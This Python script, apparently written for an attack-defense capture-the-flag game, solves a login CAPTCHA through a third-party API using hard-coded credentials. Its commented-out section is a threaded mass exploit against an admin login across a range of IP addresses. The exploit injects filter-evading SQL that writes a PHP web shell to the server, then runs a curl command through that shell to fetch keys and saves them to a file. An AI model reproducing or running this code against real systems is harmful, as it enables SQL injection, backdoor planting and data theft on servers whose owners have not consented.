import requests
import base64
import threading
import json
from lxml import etree

session = requests.Session()


def base64_api():
    with open('123.png', 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {'username': 'Jonathan', 'password': '123456', 'typeid': 3, 'image': b64}
    result = json.loads(requests.post('http://api.ttshitu.com/predict', json=data).text)
    if result['success']:
        return result['data']['result']
    else:
        return result['message']


if __name__ == '__main__':

    print(base64_api())

# def start(target):
#     ip = target
#
#     response = session.get(f'http://{ip}/admin/admin_code.php')
#
#     with open('image.jpg', 'wb') as f:
#         f.write(response.content)
#
#     result = base64_api()
#
#     payload = '''
#     'admin' uni union on selselectect null,null,null,null,char(60, 63, 112, 104, 112, 32, 115, 121, 115, 116, 101, 109, 40, 36, 95, 80, 79, 83, 84, 91, 99, 109, 100, 93, 41, 59, 63, 62)  in into  outoutfilefile '/var/www/html/shell333.php'#'
#     '''
#     paramsGet = {'action': 'ck_login'}
#     paramsPost = {'password': '123', 'code': f'{result}', 'submit': 'true', 'user': f'{payload}', 'submit.x': '33',
#                   'submit.y': '31'}
#     try:
#         resp = session.post(f'http://{ip}/admin/login.php', data=paramsPost, params=paramsGet)
#         html = etree.HTML(resp.text)
#         result = html.xpath("//div[@class='msg_contain']/p")[0].text
#         shell(target=ip, result=result)
#
#     except Exception:
#         pass
#
#
# def shell(target, result):
#     ip = target
#     if '不存在' in result:
#         print('写入shell成功')
#         shell_url = f'http://{ip}/shell333.php'
#         post_data = {'cmd': 'curl 172.17.120.6/getkey'}
#         try:
#             res = session.post(url=shell_url, data=post_data)
#             res = res.text[-37::]
#             with open('key.txt', 'a+') as f:
#                 f.write(res + '\n')
#         except Exception:
#             pass
#
#     elif '验证码不正确' in result:
#         start(ip)
#
#     else:
#         pass
#
#
# if __name__ == '__main__':
#     targets = []
#     ip = '4.4.%s.102'
#     for i in range(1, 50):
#         targets.append(ip % i)
#
#     for target in targets:
#         t = threading.Thread(target=start, args=(target,))
#         t.start()
